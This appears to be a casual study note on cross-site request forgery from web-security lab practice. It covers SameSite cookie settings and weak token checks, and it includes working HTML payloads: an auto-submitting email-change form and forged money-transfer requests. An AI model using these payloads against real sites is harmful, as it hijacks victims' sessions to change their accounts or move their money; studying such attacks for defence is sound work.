Browsers automatically attach your cookies, so u can make a victim do a malicious action in vulnerable site like transfer you money or change their password if they have no CSRF protection.

Requires user interaction! (to click on ur link)

## SameSite
Set it like this: `Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`
When setting a cookie with SameSite=None, the website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set: `Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`

Cookies are sent when:

Strict - Only send if site is same

Lax - Request is GET and resulted from a top-level navigation (top-level navigation changes the url in your address bar)

None - Always sent

## Constructing exploit
CSRF PoC generator that is built in to Burp Suite Professional. It basically generates a bare bones HTML page with an autosubmitting form by using `document.forms[0].submit()` in a script.
<details>
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0000e104ff3af7852a367600390083.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;b&#46;c" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
</details>

CSRF tokens implemented poorly:
* Sometimes CSRF tokens are only validated through one HTTP method, so try all.
* Sometimes removing the token entirely bypasses the check completely
* Sometimes attacker can use the CSRF token from his own form to construct the CSRF attack as the token is not tied to the user session, or the token is tied to another key which is also user-controllable (attacker can replace both the token and the key with his own)
* Sometimes the website just copies the CSRF token from the form into a cookie and check if they match, so you just copy ur CSRF token into both the form and the cookie

Bypassing SameSite restrictions:
* Sometimes the POST request also accepts GET method
<details>
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```
or
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
</details>
